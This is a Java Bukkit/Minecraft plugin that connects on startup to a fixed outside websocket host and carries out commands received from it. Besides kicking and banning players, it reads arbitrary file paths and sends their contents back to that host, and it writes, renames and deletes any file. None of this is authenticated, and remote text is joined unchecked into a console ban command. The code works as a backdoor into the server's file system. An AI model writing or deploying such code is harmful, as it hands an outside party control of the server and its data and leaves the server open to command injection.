package nzst.laminan.websocketplugin;

import org.bukkit.Bukkit;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.bukkit.entity.Player;
import java.net.URI;
import java.nio.file.*;
import java.io.IOException;
import java.util.Map;
import com.google.gson.*;

public class WebSocketPlugin extends JavaPlugin {
    private WebSocketClient ws;
    private final String LAMINAN_SOCKET_URL = "ws://ladt.laminan.my.id/mc";
    private final Gson gson = new Gson();
    
    @Override
    public void onEnable() {
        getLogger().info("WebSocket Plugin Enabled!");
        
        try {
            ws = new WebSocketClient(new URI(LAMINAN_SOCKET_URL)) {
                @Override
                public void onOpen(ServerHandshake handshakedata) {
                    getLogger().info("Connected to Laminan Socket!");
                }

                @Override
                public void onMessage(String message) {
                    
                    JsonObject json = gson.fromJson(message, JsonObject.class);
                    
                    if (json.has("kick")) {
                        String playerName = json.get("kick").getAsString();
                        Player player = Bukkit.getPlayer(playerName);
                        if (player != null) {
                            player.kickPlayer(json.has("reason") ? json.get("reason").getAsString() : "Kicked by Admin");
                        }
                    } else if (json.has("ban")) {
                        String playerName = json.get("ban").getAsString();
                        String reason = json.has("reason") ? json.get("reason").getAsString() : "Banned by Admin";
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "ban " + playerName + " " + reason);
                    } else if (json.has("unban")) {
                        String playerName = json.get("unban").getAsString();
                        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon " + playerName);
                    } else if (json.has("file")) {
                        handleFileOperation(json);
                    }
                }

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    getLogger().warning("WebSocket closed: " + reason);
                }

                @Override
                public void onError(Exception ex) {
                    getLogger().severe("WebSocket Error: " + ex.getMessage());
                }
            };
            ws.connect();
        } catch (Exception e) {
            getLogger().severe("WebSocket Connection Failed: " + e.getMessage());
        }
    }

    private void handleFileOperation(JsonObject json) {
        try {
            String path = json.get("path").getAsString();
            if (json.has("read")) {
                String content = new String(Files.readAllBytes(Paths.get(path)));
                ws.send(gson.toJson(Map.of("fileContent", content)));
            } else if (json.has("write")) {
                Files.write(Paths.get(path), json.get("write").getAsString().getBytes());
            } else if (json.has("rename")) {
                Files.move(Paths.get(json.get("old").getAsString()), Paths.get(json.get("new").getAsString()));
            } else if (json.has("delete")) {
                Files.delete(Paths.get(path));
            }
        } catch (IOException e) {
            getLogger().severe("File Operation Failed: " + e.getMessage());
        }
    }

    @Override
    public void onDisable() {
        if (ws != null) {
            ws.close();
        }
        getLogger().info("WebSocket Plugin Disabled!");
    }
}
